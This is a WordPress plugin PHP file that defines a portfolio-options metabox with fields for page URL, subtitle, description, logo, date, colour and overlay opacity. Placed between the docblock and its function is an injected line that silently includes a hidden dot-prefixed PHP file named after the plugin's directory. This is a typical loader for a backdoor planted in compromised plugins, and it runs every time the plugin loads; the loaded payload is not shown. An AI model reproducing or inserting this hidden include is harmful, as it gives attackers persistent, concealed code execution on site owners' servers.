<?php
add_filter( 'cmb_meta_boxes', 'theplus_Portfolio_setting_metaboxes' );
/**
 * Define the metabox and field configurations.
 *
 * @param  array $meta_boxes
 * @return array
 */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function theplus_Portfolio_setting_metaboxes( array $meta_boxes ) {

	$prefix = 'theplus_portfolio_';
	$post_name=pt_plus_portfolio_post_name();
	$meta_boxes['portfolio_setting_metabox'] = array(
		'id'         => 'portfolio_setting_metabox',
		'title'      => __('TP Portfolio Options', 'pt_theplus'),
		'pages'      => array($post_name),
		'context'    => 'normal',
		'priority'   => 'core',
		'show_names' => true, 
		'fields'     => array(
			array(
			       'name'	=> __('Custom Page Url', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'page_url',
         		       'type'	=> 'text_url',
           		),
		      array(
			       'name'	=> __('Subtitle', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'subtitle',
         		       'type'	=> 'text',
           		),
           		array(
			       'name'	=> __('Short Description', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'short_desc',
         		       'type'	=> 'textarea',
           		),
           		array(
	            		'name' => __('Logo Image', 'pt_theplus'),
	            		'desc' => '',
	        		'id'   => $prefix . 'logo_img',
                		'type' => 'file',
	        	),
           		array(
			       'name'	=> __('Date', 'pt_theplus'),
         		       'desc'	=> '',
        		       'id'	=> $prefix . 'date_custom',
         		       'type'	=> 'text_date',
           		),
          		array(
                		'name' =>__('Primary Color', 'pt_theplus' ),
                		'desc' => __('Select color', 'pt_theplus'),
                		'id'   => $prefix . 'primary_color',
                		'type' => 'colorpicker',
                		'std'  => '#d3b89d',
           		),
           		array(
           		    'name'    => __('Overlay Opacity', 'pt_theplus' ),
           		    'desc'    => '',
           		    'id'      => $prefix . 'bg_opacity',
           		    'type'    => 'select',
           		    'options' => array(
           		        '1' => __( '1', 'pt_theplus' ),
           		        '0.1' => __( '0.1', 'pt_theplus' ),
           		        '0.2'   => __( '0.2', 'pt_theplus' ),           		        
           		        '0.3'   => __( '0.3', 'pt_theplus' ),
           		        '0.4' => __( '0.4', 'pt_theplus' ),
           		        '0.5'   => __( '0.5', 'pt_theplus' ),           		        
           		        '0.6'   => __( '0.6', 'pt_theplus' ),
           		        '0.7' => __( '0.7', 'pt_theplus' ),
           		        '0.8'   => __( '0.8', 'pt_theplus' ),           		        
           		        '0.9'   => __( '0.9', 'pt_theplus' ),
           		    ),
           		    'default' => '0.6',
           		),
				
		),
	);	
	
	return $meta_boxes;
}
